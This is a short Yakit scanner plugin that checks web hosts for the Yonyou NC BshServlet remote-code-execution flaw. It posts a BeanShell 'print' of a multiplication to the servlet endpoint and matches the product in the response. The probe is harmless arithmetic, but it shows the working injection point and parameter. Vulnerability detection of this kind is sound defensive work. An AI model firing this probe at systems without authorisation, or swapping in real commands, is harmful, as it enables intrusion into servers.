yakit.AutoInitYakit()

handleCheck = func(target,port){
    var url
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    level=["","low","middle","high","critical"]
    if isTls {
        url="https://"+addr
    }else{
        url="http://"+addr
    }
    vulnable=false

    reference="yonyou nc bsh servlet bshservlet rce 漏洞"
    severity=""
    type=""
    r2 = 8197
    r1 = 8120

    poc_url_r0= url + `/servlet/~ic/bsh.servlet.BshServlet`
    req_r0, _ := http.NewRequest("POST",poc_url_r0,
    http.body(`bsh.script=print%28`+ parseStr(r1) +`*`+ parseStr(r2) +`%29%3B`),http.header("Content-Type", "application/x-www-form-urlencoded"),)
    breq,_=http.dump(req_r0)
    resp_r0, _ := http.Do(req_r0)
    bresp,_=http.dump(resp_r0)
    header, body = poc.Split(bresp)
    r0_flag = false
    if resp_r0.StatusCode == 200 && str.Contains(string(body),parseStr(parseStr(r1 * r2))){
	r0_flag = true
    }

    poc_url=poc_url_r0
    if r0_flag{
	vulnable = true
    }
    if vulnable {
            yakit.Info("FOUND INFO for %v", type)
            risk.NewRisk(
                url, risk.severity(severity), 
                risk.title(sprintf("FOUND %v", type)),
                risk.titleVerbose(sprintf("%v", reference)),
                risk.type(type), risk.typeVerbose(type),
                risk.details({
                    "request": breq,
                    "response": bresp,
                    "url": poc_url,
                }),
            )
        }
    return
}
handle = func(result) {
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
